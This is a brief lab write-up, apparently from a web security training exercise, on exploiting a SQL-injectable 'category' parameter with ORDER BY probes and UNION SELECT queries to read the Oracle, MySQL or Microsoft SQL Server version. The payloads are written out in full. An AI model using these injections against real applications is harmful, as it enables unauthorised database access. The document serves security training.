# Lab: Querying Database Type and Version (Oracle)

## Vulnerability
The `category` parameter is vulnerable to SQL injection, allowing UNION queries.

## Exploit
Determined column count:

' ORDER BY 1--

' ORDER BY 2--

' ORDER BY 3-- (error)

Confirmed 2 columns.

Extract version(oracle):

' UNION SELECT banner, NULL FROM v$version--

Extract version(MySQL and Microsoft):

' UNION SELECT @@VERSION,NULL--  (requires one space after the comment '--')

## Result
Retrieved the Oracle database version.

## Key Point
UNION queries can be used to extract data when the number of columns is known.

## Proof

<img alt="result" src="1.png" />
